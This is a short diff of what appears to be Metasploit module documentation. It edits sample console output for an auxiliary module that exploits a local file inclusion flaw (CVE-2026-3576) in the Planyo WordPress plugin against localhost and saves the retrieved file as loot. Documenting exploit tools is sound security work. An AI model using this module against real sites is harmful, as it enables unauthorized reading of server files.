@@ -101,7 +101,8 @@ The module should:
 ```
 msf auxiliary(gather/wp_planyo_lfi_cve_2026_3576) > run
 [*] Running module against 127.0.0.1
-[+] Vulnerable version of plugin detected
+[+] Planyo plugin found: {:version=>"2.9"}
+[+] This version of plugin is vulnerable
 [*] File saved to: /home/kali/.msf4/loot/20260810080420_default_127.0.0.1_planyo.http_669878.bin
 [*] Auxiliary module execution completed
 msf auxiliary(gather/wp_planyo_lfi_cve_2026_3576) > cat /home/kali/.msf4/loot/20260810080420_default_127.0.0.1_planyo.http_669878.bin
